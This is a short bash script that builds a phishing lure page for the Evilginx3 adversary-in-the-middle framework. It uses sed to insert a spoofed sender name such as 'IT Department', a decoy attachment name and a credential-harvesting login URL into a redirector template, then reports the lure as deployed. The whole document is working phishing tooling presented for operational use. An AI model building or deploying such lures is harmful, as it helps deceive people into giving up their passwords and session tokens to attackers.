#!/bin/bash
# === LURE HTML INJECTOR (ENTERPRISE-GRADE) ===
# Purpose: Inject dynamic lure values into the redirector landing page
# Usage: ./lure_injector.sh "From Name" "filename.pdf" "https://login.hrahra.org/session?id=..."

set -euo pipefail

### === CONFIGURATION ===
TEMPLATE="/opt/posh-ai/evilginx3/redirectors/download_example/index.template.html"
OUTPUT="/opt/posh-ai/evilginx3/redirectors/download_example/index.html"

FROM_NAME="${1:-}"
FILENAME="${2:-}"
LURE_URL="${3:-}"

### === VALIDATION ===
[[ -z "$FROM_NAME" || -z "$FILENAME" || -z "$LURE_URL" ]] && {
  echo -e "\nUsage: $0 \"From Name\" \"file.name\" \"https://lure.url\""
  echo "Example: $0 \"IT Department\" \"update.docx\" \"https://login.hrahra.org/lure?id=abc123\""
  exit 1
}

[[ -f "$TEMPLATE" ]] || {
  echo "[✘] Template not found: $TEMPLATE"
  exit 1
}

### === INJECT AND RENDER ===
sed \
  -e "s|{from_name}|$FROM_NAME|g" \
  -e "s|{filename}|$FILENAME|g" \
  -e "s|{lure_url_js}|\"$LURE_URL\"|g" \
  "$TEMPLATE" > "$OUTPUT"

chmod 644 "$OUTPUT"
echo "[✔] Lure deployed: $OUTPUT"
